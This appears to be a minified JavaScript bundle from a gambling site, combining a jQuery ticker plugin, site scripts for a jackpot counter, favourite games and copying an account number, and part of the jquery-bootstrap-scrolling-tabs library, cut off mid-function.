!function(i) {
    i.fn.easyTicker = function(n) {
        n = i.extend({
            direction: "up",
            easing: "swing",
            speed: "slow",
            interval: 2e3,
            height: "auto",
            visible: 0,
            mousePause: 0,
            controls: {
                up: "",
                down: "",
                toggle: ""
            }
        }, n);
        var t = 0
          , e = i("body")
          , s = i(n.controls.up)
          , o = i(n.controls.down)
          , c = i(n.controls.toggle)
          , a = function(t, e, s) {
            if (t.is(":visible")) {
                if ("up" == s)
                    var o = ":first-child"
                      , c = "-="
                      , a = "appendTo";
                else
                    o = ":last-child",
                    c = "+=",
                    a = "prependTo";
                var r = i(e).children(o)
                  , u = r.outerHeight();
                i(e).stop(!0, !0).animate({
                    top: c + u + "px"
                }, n.speed, n.easing, function() {
                    r.hide()[a](e).fadeIn(),
                    i(e).css("top", 0),
                    0 != n.visible && "auto" == n.height && l(t, e)
                })
            }
        }
          , r = function(i, s) {
            (0 == c.length || c.hasClass("et-run")) && (t = setInterval(function() {
                1 == e.attr("data-focus") && a(i, s, n.direction)
            }, n.interval))
        }
          , u = function(i) {
            clearInterval(t)
        }
          , l = function(t, e) {
            var s = 0;
            i(e).children(":lt(" + n.visible + ")").each(function() {
                s += i(this).outerHeight()
            }),
            t.stop(!0, !0).animate({
                height: s
            }, n.speed)
        }
          , h = function(n, t) {
            var e = 0
              , s = n.css("display");
            return n.css("display", "block"),
            i(t).children().each(function() {
                e += i(this).outerHeight()
            }),
            n.css("display", s),
            e
        };
        function d() {
            e.attr("data-focus", 0)
        }
        function f() {
            e.attr("data-focus", 1)
        }
        return i(window).bind("focus mouseover", f),
        i(window).bind("blur", d),
        this.each(function() {
            var t = i(this)
              , e = t.children(":first-child");
            !function(i, t) {
                t.children().css("margin", 0).children().css("margin", 0),
                i.css({
                    position: "relative",
                    height: "auto" == n.height ? h(i, t) : n.height,
                    overflow: "hidden"
                }),
                t.css({
                    position: "absolute",
                    margin: 0
                }).children().css("margin", 0),
                0 != n.visible && "auto" == n.height && l(i, t),
                c.addClass("et-run"),
                r(i, t)
            }(t, e),
            1 == n.mousePause && t.mouseover(function() {
                u()
            }).mouseleave(function() {
                r(t, e)
            }),
            c.on("click", function() {
                i(this).hasClass("et-run") ? (u(),
                i(this).removeClass("et-run")) : (i(this).addClass("et-run"),
                r(t, e))
            }),
            s.on("click", function() {
                a(t, e, "up")
            }),
            o.on("click", function() {
                a(t, e, "down")
            })
        })
    }
}(jQuery);
$( () => {
    const i = document.querySelector("#progressive_jackpot");
    if (i && i.dataset.progressiveJackpotUrl) {
        const t = {
            refresh: 4e3,
            update: 500
        }
          , n = {
            current: null,
            gap: .05
        }
          , r = async () => {
            await window.$.ajax({
                type: "GET",
                url: i.dataset.progressiveJackpotUrl + "/progressive-jackpot",
                contentType: "application/json; charset=utf-8",
                dataType: "json",
                success: i => {
                    if (isFinite(i) != !1 && !(i <= 0)) {
                        if (n.current === null) {
                            n.current = i - n.gap * (t.refresh / t.update);
                            return
                        }
                        n.gap = (i - n.current) / (t.refresh / t.update)
                    }
                }
                ,
                complete: () => {
                    setTimeout(r, t.refresh)
                }
            })
        }
        ;
        r();
        const u = () => {
            let r = "UPDATING";
            n.current !== null && (n.current += n.gap,
            r = n.current.toLocaleString(undefined, {
                minimumFractionDigits: 0,
                maximumFractionDigits: 0
            }));
            i.innerText = r;
            setTimeout(u, t.update)
        }
        ;
        u()
    }
}
);
$( () => {
    $("#winners_ticker").easyTicker()
}
);
$( () => {
    const n = document.querySelector("#download_apk");
    if (n) {
        const t = n.querySelector(":scope > div:first-child")
          , i = n.querySelector(":scope > div:last-child")
          , f = () => {
            const i = n.getBoundingClientRect()
              , t = 1 - i.top / window.innerHeight;
            return t > 1 ? 1 - t : t
        }
          , r = () => {
            const n = f();
            n > .4 && (t.style.transform = `translateX(0%)`,
            i.style.transform = `translateX(0%)`,
            t.style.opacity = 1,
            i.style.opacity = 1)
        }
          , u = document.querySelector("#scroll_container");
        if (u) {
            u.addEventListener("scroll", r);
            return
        }
        window.addEventListener("scroll", r)
    }
}
);
$( () => {
    const n = document.getElementById("game_list")
      , t = () => {
        n && (n.onclick = n => {
            if (n.target.className === "favourite-game-btn") {
                let t = "";
                t = n.target.checked ? "/game/new-favourite" : "/game/remove-favourite";
                $.ajax({
                    type: "POST",
                    data: JSON.stringify({
                        Provider: n.target.dataset.provider,
                        GameCode: n.target.value
                    }),
                    url: t,
                    contentType: "application/json; charset=utf-8",
                    dataType: "json",
                    success: t => {
                        t.errorCode != 0 && (n.target.checked = !n.target.checked,
                        registerPopup({
                            content: `Unable to update favourite game. ${t.message}`
                        }))
                    }
                    ,
                    error: () => {
                        n.target.checked = !n.target.checked,
                        registerPopup({
                            content: "Unable to update favourite game."
                        })
                    }
                })
            }
        }
        )
    }
    ;
    t()
}
);
$( () => {
    window.initializeCopyAccountNumber = n => {
        const t = document.querySelectorAll(".copy_account_number_button");
        t.forEach(t => {
            $(t).popover({
                content: n.translations.copied,
                placement: "top",
                trigger: "manual"
            }),
            t.onclick = () => {
                if (navigator.clipboard) {
                    const n = t.previousElementSibling;
                    navigator.clipboard.writeText(n.innerText.replaceAll("-", "")).then( () => {
                        const n = $(t);
                        n.popover("show");
                        setTimeout( () => n.popover("hide"), 500)
                    }
                    ).catch(n => console.log("Error when copying account number: " + n))
                }
            }
        }
        )
    }
}
);
/**
 * jquery-bootstrap-scrolling-tabs
 * @version v2.4.0
 * @link https://github.com/mikejacobson/jquery-bootstrap-scrolling-tabs
 * @author Mike Jacobson <michaeljjacobson1@gmail.com>
 * @license MIT License, http://www.opensource.org/licenses/MIT
 */
!function(e, t) {
    "use strict";
    function n(e) {
        this.stc = e
    }
    function r(e) {
        this.stc = e
    }
    function a(e) {
        this.stc = e
    }
    function o(t) {
        var o = this;
        o.$tabsContainer = t,
        o.instanceId = e.fn.scrollingTabs.nextInstanceId++,
        o.movableContainerLeftPos = 0,
        o.scrollArrowsVisible = !1,
        o.scrollToTabEdge = !1,
        o.disableScrollArrowsOnFullyScrolled = !1,
        o.reverseScroll = !1,
        o.widthMultiplier = 1,
        o.scrollMovement = new a(o),
        o.eventHandlers = new r(o),
        o.elementsHandler = new n(o)
    }
    function i(t, n, r) {
        var a, o = n.tabs, i = {
            paneId: n.propPaneId,
            title: n.propTitle,
            active: n.propActive,
            disabled: n.propDisabled,
            content: n.propContent
        }, l = n.ignoreTabPanes, c = o.length && void 0 !== o[0][i.content], d = A.getNewElNavTabs(), b = A.getNewElTabContent(), f = l ? null : function() {
            a.after(b)
        }
        ;
        if (o.length)
            return o.forEach(function(e, t) {
                var r = {
                    forceActiveTab: !0,
                    tabLiContent: n.tabsLiContent && n.tabsLiContent[t],
                    tabPostProcessor: n.tabsPostProcessors && n.tabsPostProcessors[t]
                };
                A.getNewElTabLi(e, i, r).appendTo(d),
                !l && c && A.getNewElTabPane(e, i, r).appendTo(b)
            }),
            a = s(d, n, r, f),
            a.appendTo(t),
            t.data({
                scrtabs: {
                    tabs: o,
                    propNames: i,
                    ignoreTabPanes: l,
                    hasTabContent: c,
                    tabsLiContent: n.tabsLiContent,
                    tabsPostProcessors: n.tabsPostProcessors,
                    scroller: a
                }
            }),
            a.find(".nav-tabs > li").each(function(t) {
                L.storeDataOnLiEl(e(this), o, t)
            }),
            t
    }
    function s(e, t, n, r) {
        var a = A.getNewElScrollerElementWrappingNavTabsInstance(e.clone(!0), t)
          , i = new o(a)
          , s = e.data("scrtabs");
        return s ? s.scroller = a : e.data("scrtabs", {
            scroller: a
        }),
        e.replaceWith(a.css("visibility", "hidden")),
        t.tabClickHandler && "function" == typeof t.tabClickHandler && (a.hasTabClickHandler = !0,
        i.tabClickHandler = t.tabClickHandler),
        a.initTabs = function() {
            i.initTabs(t, a, n, r)
        }
        ,
        a.scrollToActiveTab = function() {
            i.scrollToActiveTab(t)
        }
        ,
        a.initTabs(),
        C(a, i),
        a
    }
    function l(e) {
        var t = e.updatedTabsArray
          , n = e.updatedTabsLiContent || []
          , r = e.updatedTabsPostProcessors || []
          , a = e.propNames
          , o = e.ignoreTabPanes
          , i = e.options
          , s = e.$currTabLis
          , l = e.$navTabs
          , c = o ? null : e.$currTabContentPanesContainer
          , d = o ? null : e.$currTabContentPanes
          , b = !1;
        return t.forEach(function(e, f) {
            var C, v = s.find('a[href="#' + e[a.paneId] + '"]'), u = f >= s.length;
            v.length || (b = !0,
            i.tabLiContent = n[f],
            i.tabPostProcessor = r[f],
            v = A.getNewElTabLi(e, a, i),
            L.storeDataOnLiEl(v, t, f),
            u ? v.appendTo(l) : v.insertBefore(s.eq(f)),
            o || void 0 === e[a.content] || (C = A.getNewElTabPane(e, a, i),
            u ? C.appendTo(c) : C.insertBefore(d.eq(f))))
        }),
        b
    }
    function c(e) {
        var t = e.tabLi
          , n = e.ignoreTabPanes
          , r = t.$li
          , a = t.$contentPane
          , o = t.origTabData
          , i = t.newTabData
          , s = e.propNames
          , l = !1;
        return o[s.title] !== i[s.title] && (r.find('a[role="tab"]').html(o[s.title] = i[s.title]),
        l = !0),
        o[s.disabled] !== i[s.disabled] && (i[s.disabled] ? (r.addClass("disabled"),
        r.find('a[role="tab"]').attr("data-toggle", "")) : (r.removeClass("disabled"),
        r.find('a[role="tab"]').attr("data-toggle", "tab")),
        o[s.disabled] = i[s.disabled],
        l = !0),
        e.options.forceActiveTab && (r[i[s.active] ? "addClass" : "removeClass"]("active"),
        a[i[s.active] ? "addClass" : "removeClass"]("active"),
        o[s.active] = i[s.active],
        l = !0),
        n || o[s.content] === i[s.content] || (a.html(o[s.content] = i[s.content]),
        l = !0),
        l
    }
    function d(e) {
        var t, n = e.tabLi, r = e.ignoreTabPanes, a = n.$li;
        return -1 === n.newIdx && (a.hasClass("active") && (t = L.getIndexOfClosestEnabledTab(e.$currTabLis, n.currDomIdx)) > -1 && (e.$currTabLis.eq(t).addClass("active"),
        r || e.$currTabContentPanes.eq(t).addClass("active")),
        a.remove(),
        r || n.$contentPane.remove(),
        !0)
    }
    function b(t) {
        var n = t.$currTabLis
          , r = t.updatedTabsArray
          , a = t.propNames
          , o = t.ignoreTabPanes
          , i = []
          , s = o ? null : [];
        return !!L.didTabOrderChange(n, r, a) && (r.forEach(function(t) {
            var r = t[a.paneId];
            i.push(n.find('a[role="tab"][href="#' + r + '"]').parent("li")),
            o || s.push(e("#" + r))
        }),
        t.$navTabs.append(i),
        o || t.$currTabContentPanesContainer.append(s),
        !0)
    }
    function f(t) {
        var n = t.$currTabLis
          , r = t.updatedTabsArray
          , a = t.propNames
          , o = !1;
        return n.each(function(n) {
            var i = e(this)
              , s = i.data("tab")
              , l = L.getTabIndexByPaneId(r, a.paneId, s[a.paneId])
              , b = l > -1 ? r[l] : null;
            if (t.tabLi = {
                $li: i,
                currDomIdx: n,
                newIdx: l,
                $contentPane: A.getElTabPaneForLi(i),
                origTabData: s,
                newTabData: b
            },
            d(t))
                return void (o = !0);
            c(t) && (o = !0)
        }),
        o
    }
    function C(t, n) {
        function r(t) {
            e(t.target).append(o.off(T.EVENTS.CLICK))
        }
        function a(r) {
            function a() {
                var n = e(this)
                  , r = n.parent("li")
                  , a = r.parent(".dropdown-menu")
                  , o = n.attr("href");
                r.hasClass("active") || (t.find("li.active").not(c).add(a.find("li.active")).removeClass("active"),
                c.add(r).addClass("active"),
                e(".tab-content .tab-pane.active").removeClass("active"),
                e(o).addClass("active"))
            }
            var i, s, l, c = e(r.target), d = c.offset(), b = t.find('li[role="presentation"].active');
            o = c.find(".dropdown-menu").attr("data-" + T.DATA_KEY_DDMENU_MODIFIED, !0),
            b[0] !== c[0] && o.find("li.active").removeClass("active"),
            o.on(T.EVENTS.CLICK, 'a[role="tab"]', a),
            e("body").append(o),
            i = o.width() + d.left,
            s = t.width() - (n.$slideRightArrow.outerWidth() + 1),
            l = d.left,
            i > s && (l -= i - s),
            o.css({
                display: "block",
                top: d.top + c.outerHeight() - 2,
                left: l
            })
        }
        var o;
        t.on(T.EVENTS.DROPDOWN_MENU_SHOW, a).on(T.EVENTS.DROPDOWN_MENU_HIDE, r)
    }
    function v(e, t) {
        var n = e.data().scrtabs
          , r = n.scroller
          , a = e.find(".scrtabs-tab-container .nav-tabs")
          , o = e.find(".tab-content")
          , i = !1
          , s = {
            options: t,
            updatedTabsArray: n.tabs,
            updatedTabsLiContent: n.tabsLiContent,
            updatedTabsPostProcessors: n.tabsPostProcessors,
            propNames: n.propNames,
            ignoreTabPanes: n.ignoreTabPanes,
            $navTabs: a,
            $currTabLis: a.find("> li"),
            $currTabContentPanesContainer: o,
            $currTabContentPanes: o.find(".tab-pane")
        };
        return l(s) && (i = !0),
        b(s) && (i = !0),
        f(s) && (i = !0),
        i && r.initTabs(),
        i
    }
    function u(t, n) {
        t.data("scrtabs") && (!t.data("scrtabs").isWrapperOnly && v(t, n) || e("body").trigger(T.EVENTS.FORCE_REFRESH))
    }
    function h() {
        var t = e(this)
          , n = t.data("scrtabs");
        n && n.scroller.scrollToActiveTab()
    }
    function S() {
        var n, r = e(this), a = r.data("scrtabs");
        if (a) {
            for ("self" === a.enableSwipingElement ? r.removeClass(T.CSS_CLASSES.ALLOW_SCROLLBAR) : "parent" === a.enableSwipingElement && r.closest(".scrtabs-tab-container").parent().removeClass(T.CSS_CLASSES.ALLOW_SCROLLBAR),
            a.scroller.off(T.EVENTS.DROPDOWN_MENU_SHOW).off(T.EVENTS.DROPDOWN_MENU_HIDE),
            a.scroller.find("[data-" + T.DATA_KEY_DDMENU_MODIFIED + "]").css({
                display: "",
                left: "",
                top: ""
            }).off(T.EVENTS.CLICK).removeAttr("data-" + T.DATA_KEY_DDMENU_MODIFIED),
            a.scroller.hasTabClickHandler && r.find('a[data-toggle="tab"]').off(".scrtabs"),
            a.isWrapperOnly ? (n = r.parents(".scrtabs-tab-container"),
            n.length && n.replaceWith(r)) : (a.scroller && a.scroller.initTabs && (a.scroller.initTabs = null),
            r.find(".scrtabs-tab-container").add(".tab-content").remove()),
            r.removeData("scrtabs"); --e.fn.scrollingTabs.nextInstanceId >= 0; )
                e(t).off(T.EVENTS.WINDOW_RESIZE + e.fn.scrollingTabs.nextInstanceId);
            e("body").off(T.EVENTS.FORCE_REFRESH)
        }
    }
    var T = {
        CONTINUOUS_SCROLLING_TIMEOUT_INTERVAL: 50,
        SCROLL_OFFSET_FRACTION: 6,
        DATA_KEY_DDMENU_MODIFIED: "scrtabsddmenumodified",
        DATA_KEY_IS_MOUSEDOWN: "scrtabsismousedown",
        CSS_CLASSES: {
            BOOTSTRAP4: "scrtabs-bootstrap4",
            RTL: "scrtabs-rtl",
            SCROLL_ARROW_CLICK_TARGET: "scrtabs-click-target",
            SCROLL_ARROW_DISABLE: "scrtabs-disable",
            SCROLL_ARROW_WITH_CLICK_TARGET: "scrtabs-with-click-target"
        },
        SLIDE_DIRECTION: {
            LEFT: 1,
            RIGHT: 2
        },
        EVENTS: {
            CLICK: "click.scrtabs",
            DROPDOWN_MENU_HIDE: "hide.bs.dropdown.scrtabs",
            DROPDOWN_MENU_SHOW: "show.bs.dropdown.scrtabs",
            FORCE_REFRESH: "forcerefresh.scrtabs",
            MOUSEDOWN: "mousedown.scrtabs",
            MOUSEUP: "mouseup.scrtabs",
            TABS_READY: "ready.scrtabs",
            TOUCH_END: "touchend.scrtabs",
            TOUCH_MOVE: "touchmove.scrtabs",
            TOUCH_START: "touchstart.scrtabs",
            WINDOW_RESIZE: "resize.scrtabs"
        }
    };
    !function(t) {
        var n = function(e, t, n) {
            var r;
            return function() {
                function a() {
                    n || e.apply(o, i),
                    r = null
                }
                var o = this
                  , i = arguments;
                r ? clearTimeout(r) : n && e.apply(o, i),
                r = setTimeout(a, t || 100)
            }
        };
        e.fn[t] = function(e, r) {
            var a = r || T.EVENTS.WINDOW_RESIZE;
            return e ? this.bind(a, n(e)) : this.trigger(t)
        }
    }("smartresizeScrtabs"),
    function(n) {
        n.initElements = function(e) {
            var t = this;
            t.setElementReferences(e),
            t.setEventListeners(e)
        }
        ,
        n.listenForTouchEvents = function() {
            var e, t, n, r = this, a = r.stc, o = a.scrollMovement, i = T.EVENTS, s = !1;
            a.$movableContainer.on(i.TOUCH_START, function(n) {
                s = !0,
                t = a.movableContainerLeftPos,
                e = n.originalEvent.changedTouches[0].pageX
            }).on(i.TOUCH_END, function() {
                s = !1
            }).on(i.TOUCH_MOVE, function(r) {
                if (s) {
                    var i = r.originalEvent.changedTouches[0].pageX
                      , l = i - e;
                    a.rtl && (l = -l);
                    var c;
                    n = t + l,
                    n > 0 ? n = 0 : (c = o.getMinPos(),
                    n < c && (n = c)),
                    a.movableContainerLeftPos = n;
                    var d = a.rtl ? "right" : "left";
                    a.$movableContainer.css(d, o.getMovableContainerCssLeftVal()),
                    o.refreshScrollArrowsDisabledState()
                }
            })
        }
        ,
        n.refreshAllElementSizes = function() {
            var e, t = this, n = t.stc, r = n.scrollMovement, a = n.scrollArrowsVisible, o = {
                didScrollToActiveTab: !1
            }, i = !1;
            return t.setElementWidths(),
            t.setScrollArrowVisibility(),
            n.scrollArrowsVisible ? (e = r.getMinPos(),
            i = r.scrollToActiveTab({
                isOnWindowResize: !0
            }),
            i || (r.refreshScrollArrowsDisabledState(),
            n.rtl ? n.movableContainerRightPos < e && r.incrementMovableContainerLeft(e) : n.movableContainerLeftPos < e && r.incrementMovableContainerRight(e)),
            o.didScrollToActiveTab = !0) : a && (n.movableContainerLeftPos = 0,
            r.slideMovableContainerToLeftPos()),
            o
        }
        ,
        n.setElementReferences = function(n) {
            var r, a, o, i, s = this, l = s.stc, c = l.$tabsContainer;
            l.isNavPills = !1,
            l.rtl && c.addClass(T.CSS_CLASSES.RTL),
            l.usingBootstrap4 && c.addClass(T.CSS_CLASSES.BOOTSTRAP4),
            l.$fixedContainer = c.find(".scrtabs-tabs-fixed-container"),
            r = l.$fixedContainer.prev(),
            a = l.$fixedContainer.next(),
            n.leftArrowContent && (o = r.find("." + T.CSS_CLASSES.SCROLL_ARROW_CLICK_TARGET)),
            n.rightArrowContent && (i = a.find("." + T.CSS_CLASSES.SCROLL_ARROW_CLICK_TARGET)),
            o && o.length ? r.addClass(T.CSS_CLASSES.SCROLL_ARROW_WITH_CLICK_TARGET) : o = r,
            i && i.length ? a.addClass(T.CSS_CLASSES.SCROLL_ARROW_WITH_CLICK_TARGET) : i = a,
            l.$movableContainer = c.find(".scrtabs-tabs-movable-container"),
            l.$tabsUl = c.find(".nav-tabs"),
            l.$tabsUl.length || (l.$tabsUl = c.find(".nav-pills"),
            l.$tabsUl.length && (l.isNavPills = !0)),
            l.$tabsLiCollection = l.$tabsUl.find("> li"),
            l.$slideLeftArrow = l.reverseScroll ? r : a,
            l.$slideLeftArrowClickTarget = l.reverseScroll ? o : i,
            l.$slideRightArrow = l.reverseScroll ? a : r,
            l.$slideRightArrowClickTarget = l.reverseScroll ? i : o,
            l.$scrollArrows = l.$slideLeftArrow.add(l.$slideRightArrow),
            l.$win = e(t)
        }
        ,
        n.setElementWidths = function() {
            var e = this
              , t = e.stc;
            t.winWidth = t.$win.width(),
            t.scrollArrowsCombinedWidth = t.$slideLeftArrow.outerWidth() + t.$slideRightArrow.outerWidth(),
            e.setFixedContainerWidth(),
            e.setMovableContainerWidth()
        }
        ,
        n.setEventListeners = function(t) {
            var n = this
              , r = n.stc
              , a = r.eventHandlers
              , o = T.EVENTS
              , i = o.WINDOW_RESIZE + r.instanceId;
            t.enableSwiping && n.listenForTouchEvents(),
            r.$slideLeftArrowClickTarget.off(".scrtabs").on(o.MOUSEDOWN, function(e) {
                a.handleMousedownOnSlideMovContainerLeftArrow.call(a, e)
            }).on(o.MOUSEUP, function(e) {
                a.handleMouseupOnSlideMovContainerLeftArrow.call(a, e)
            }).on(o.CLICK, function(e) {
                a.handleClickOnSlideMovContainerLeftArrow.call(a, e)
            }),
            r.$slideRightArrowClickTarget.off(".scrtabs").on(o.MOUSEDOWN, function(e) {
                a.handleMousedownOnSlideMovContainerRightArrow.call(a, e)
            }).on(o.MOUSEUP, function(e) {
                a.handleMouseupOnSlideMovContainerRightArrow.call(a, e)
            }).on(o.CLICK, function(e) {
                a.handleClickOnSlideMovContainerRightArrow.call(a, e)
            }),
            r.tabClickHandler && r.$tabsLiCollection.find('a[data-toggle="tab"]').off(o.CLICK).on(o.CLICK, r.tabClickHandler),
            r.$win.off(i).smartresizeScrtabs(function(e) {
                a.handleWindowResize.call(a, e)
            }, i),
            e("body").on(T.EVENTS.FORCE_REFRESH, r.elementsHandler.refreshAllElementSizes.bind(r.elementsHandler))
        }
        ,
        n.setFixedContainerWidth = function() {
            var e = this
              , t = e.stc
              , n = t.$tabsContainer.get(0).getBoundingClientRect();
            t.fixedContainerWidth = n.width || n.right - n.left,
            t.fixedContainerWidth = t.fixedContainerWidth * t.widthMultiplier,
            t.$fixedContainer.width(t.fixedContainerWidth)
        }
        ,
        n.setFixedContainerWidthForHiddenScrollArrows = function() {
            var e = this
              , t = e.stc;
            t.$fixedContainer.width(t.fixedContainerWidth)
        }
        ,
        n.setFixedContainerWidthForVisibleScrollArrows = function() {
            var e = this
              , t = e.stc;
            t.$fixedContainer.width(t.fixedContainerWidth - t.scrollArrowsCombinedWidth)
        }
        ,
        n.setMovableContainerWidth = function() {
            var t = this
              , n = t.stc
              , r = n.$tabsUl.find("> li");
            n.movableContainerWidth = 0,
            r.length && (r.each(function() {
                var t = e(this)
                  , r = 0;
                n.isNavPills && (r = parseInt(t.css("margin-left"), 10) + parseInt(t.css("margin-right"), 10)),
                n.movableContainerWidth += t.outerWidth() + r
            }),
            n.movableContainerWidth += 1,
            n.movableContainerWidth < n.fixedContainerWidth && (n.movableContainerWidth = n.fixedContainerWidth)),
            n.$movableContainer.width(n.movableContainerWidth)
        }
        ,
        n.setScrollArrowVisibility = function() {
            var e = this
              , t = e.stc
              , n = t.movableContainerWidth > t.fixedContainerWidth;
            n && !t.scrollArrowsVisible ? (t.$scrollArrows.show(),
            t.scrollArrowsVisible = !0) : !n && t.scrollArrowsVisible && (t.$scrollArrows.hide(),
            t.scrollArrowsVisible = !1),
            t.scrollArrowsVisible ? e.setFixedContainerWidthForVisibleScrollArrows() : e.setFixedContainerWidthForHiddenScrollArrows()
        }
    }(n.prototype),
    function(e) {
        e.handleClickOnSlideMovContainerLeftArrow = function() {
            this.stc.scrollMovement.incrementMovableContainerLeft()
        }
        ,
        e.handleClickOnSlideMovContainerRightArrow = function() {
            this.stc.scrollMovement.incrementMovableContainerRight()
        }
        ,
        e.handleMousedownOnSlideMovContainerLeftArrow = function() {
            var e = this
              , t = e.stc;
            t.$slideLeftArrowClickTarget.data(T.DATA_KEY_IS_MOUSEDOWN, !0),
            t.scrollMovement.continueSlideMovableContainerLeft()
        }
        ,
        e.handleMousedownOnSlideMovContainerRightArrow = function() {
            var e = this
              , t = e.stc;
            t.$slideRightArrowClickTarget.data(T.DATA_KEY_IS_MOUSEDOWN, !0),
            t.scrollMovement.continueSlideMovableContainerRight()
        }
        ,
        e.handleMouseupOnSlideMovContainerLeftArrow = function() {
            this.stc.$slideLeftArrowClickTarget.data(T.DATA_KEY_IS_MOUSEDOWN, !1)
        }
        ,
        e.handleMouseupOnSlideMovContainerRightArrow = function() {
            this.stc.$slideRightArrowClickTarget.data(T.DATA_KEY_IS_MOUSEDOWN, !1)
        }
        ,
        e.handleWindowResize = function() {
            var e = this
              , t = e.stc
              , n = t.$win.width();
            if (n === t.winWidth)
                return !1;
            t.winWidth = n,
            t.elementsHandler.refreshAllElementSizes()
        }
    }(r.prototype),
    function(t) {
        t.continueSlideMovableContainerLeft = function() {
            var e = this
              , t = e.stc;
            setTimeout(function() {
                t.movableContainerLeftPos <= e.getMinPos() || !t.$slideLeftArrowClickTarget.data(T.DATA_KEY_IS_MOUSEDOWN) || e.incrementMovableContainerLeft() || e.continueSlideMovableContainerLeft()
            }, T.CONTINUOUS_SCROLLING_TIMEOUT_INTERVAL)
        }
        ,
        t.continueSlideMovableContainerRight = function() {
            var e = this
              , t = e.stc;
            setTimeout(function() {
                t.movableContainerLeftPos >= 0 || !t.$slideRightArrowClickTarget.data(T.DATA_KEY_IS_MOUSEDOWN) || e.incrementMovableContainerRight() || e.continueSlideMovableContainerRight()
            }, T.CONTINUOUS_SCROLLING_TIMEOUT_INTERVAL)
        }
        ,
        t.decrementMovableContainerLeftPos = function(e) {
            var t = this
              , n = t.stc;
            n.movableContainerLeftPos -= n.fixedContainerWidth / T.SCROLL_OFFSET_FRACTION,
            n.movableContainerLeftPos < e ? n.movableContainerLeftPos = e : n.scrollToTabEdge && (t.setMovableContainerLeftPosToTabEdge(T.SLIDE_DIRECTION.LEFT),
            n.movableContainerLeftPos < e && (n.movableContainerLeftPos = e))
        }
        ,
        t.disableSlideLeftArrow = function() {
            var e = this
              , t = e.stc;
            t.disableScrollArrowsOnFullyScrolled && t.scrollArrowsVisible && t.$slideLeftArrow.addClass(T.CSS_CLASSES.SCROLL_ARROW_DISABLE)
        }
        ,
        t.disableSlideRightArrow = function() {
            var e = this
              , t = e.stc;
            t.disableScrollArrowsOnFullyScrolled && t.scrollArrowsVisible && t.$slideRightArrow.addClass(T.CSS_CLASSES.SCROLL_ARROW_DISABLE)
        }
        ,
        t.enableSlideLeftArrow = function() {
            var e = this
              , t = e.stc;
            t.disableScrollArrowsOnFullyScrolled && t.scrollArrowsVisible && t.$slideLeftArrow.removeClass(T.CSS_CLASSES.SCROLL_ARROW_DISABLE)
        }
        ,
        t.enableSlideRightArrow = function() {
            var e = this
              , t = e.stc;
            t.disableScrollArrowsOnFullyScrolled && t.scrollArrowsVisible && t.$slideRightArrow.removeClass(T.CSS_CLASSES.SCROLL_ARROW_DISABLE)
        }
        ,
        t.getMinPos = function() {
            var e = this
              , t = e.stc;
            return t.scrollArrowsVisible ? t.fixedContainerWidth - t.movableContainerWidth - t.scrollArrowsCombinedWidth : 0
        }
        ,
        t.getMovableContainerCssLeftVal = function() {
            var e = this
              , t = e.stc;
            return 0 === t.movableContainerLeftPos ? "0" : t.movableContainerLeftPos + "px"
        }
        ,
        t.incrementMovableContainerLeft = function() {
            var e = this
              , t = e.stc
              , n = e.getMinPos();
            return e.decrementMovableContainerLeftPos(n),
            e.slideMovableContainerToLeftPos(),
            e.enableSlideRightArrow(),
            t.movableContainerLeftPos === n
        }
        ,
        t.incrementMovableContainerRight = function(e) {
            var t = this
              , n = t.stc;
            return e ? n.movableContainerLeftPos = e : (n.movableContainerLeftPos += n.fixedContainerWidth / T.SCROLL_OFFSET_FRACTION,
            n.movableContainerLeftPos > 0 ? n.movableContainerLeftPos = 0 : n.scrollToTabEdge && t.setMovableContainerLeftPosToTabEdge(T.SLIDE_DIRECTION.RIGHT)),
            t.slideMovableContainerToLeftPos(),
            t.enableSlideLeftArrow(),
            0 === n.movableContainerLeftPos
        }
        ,
        t.refreshScrollArrowsDisabledState = function() {
            var e = this
              , t = e.stc;
            if (t.disableScrollArrowsOnFullyScrolled && t.scrollArrowsVisible) {
                if (t.movableContainerLeftPos >= 0)
                    return e.disableSlideRightArrow(),
                    void e.enableSlideLeftArrow();
                if (t.movableContainerLeftPos <= e.getMinPos())
                    return e.disableSlideLeftArrow(),
                    void e.enableSlideRightArrow();
                e.enableSlideLeftArrow(),
                e.enableSlideRightArrow()
            }
        }
        ,
        t.scrollToActiveTab = function() {
            var e, t, n, r, a, o, i, s = this, l = s.stc;
            if (l.scrollArrowsVisible && (l.usingBootstrap4 ? (t = l.$tabsUl.find("li > .nav-link.active"),
            t.length && (e = t.parent())) : e = l.$tabsUl.find("li.active"),
            e && e.length)) {
                if (i = l.$slideRightArrow.outerWidth(),
                n = e.offset().left - l.$fixedContainer.offset().left,
                r = n + e.outerWidth(),
                a = l.fixedContainerWidth - i,
                l.rtl) {
                    if (o = l.$slideLeftArrow.outerWidth(),
                    n < 0)
                        return l.movableContainerLeftPos += n,
                        s.slideMovableContainerToLeftPos(),
                        !0;
                    if (r > a)
                        return l.movableContainerLeftPos += r - a + 2 * i,
                        s.slideMovableContainerToLeftPos(),
                        !0
                } else {
                    if (r > a)
                        return l.movableContainerLeftPos -= r - a + i,
                        s.slideMovableContainerToLeftPos(),
                        !0;
                    if (o = l.$slideLeftArrow.outerWidth(),
                    n < o)
                        return l.movableContainerLeftPos += o - n,
                        s.slideMovableContainerToLeftPos(),
                        !0
                }
                return !1
            }
        }
        ,
        t.setMovableContainerLeftPosToTabEdge = function(t) {
            var n = this
              , r = n.stc
              , a = -r.movableContainerLeftPos
              , o = 0;
            r.$tabsLiCollection.each(function() {
                var n = e(this).width();
                if ((o += n) > a)
                    return r.movableContainerLeftPos = t === T.SLIDE_DIRECTION.RIGHT ? -(o - n) : -o,
                    !1
            })
        }
        ,
        t.slideMovableContainerToLeftPos = function() {
            var e, t = this, n = t.stc, r = t.getMinPos();
            n.movableContainerLeftPos > 0 ? n.movableContainerLeftPos = 0 : n.movableContainerLeftPos < r && (n.movableContainerLeftPos = r),
            n.movableContainerLeftPos = n.movableContainerLeftPos / 1,
            e = t.getMovableContainerCssLeftVal(),
            t.performingSlideAnim = !0;
            var a = n.rtl ? {
                right: e
            } : {
                left: e
            };
            n.$movableContainer.stop().animate(a, "slow", function() {
                var e = t.getMinPos();
                t.performingSlideAnim = !1,
                n.movableContainerLeftPos < e ? (t.decrementMovableContainerLeftPos(e),
                a = n.rtl ? {
                    right: t.getMovableContainerCssLeftVal()
                } : {
                    left: t.getMovableContainerCssLeftVal()
                },
                n.$movableContainer.stop().animate(a, "fast", function() {
                    t.refreshScrollArrowsDisabledState()
                })) : t.refreshScrollArrowsDisabledState()
            })
        }
    }(a.prototype),
    function(t) {
        t.initTabs = function(t, n, r, a) {
            function o() {
                n.find(".nav-tabs").show(),
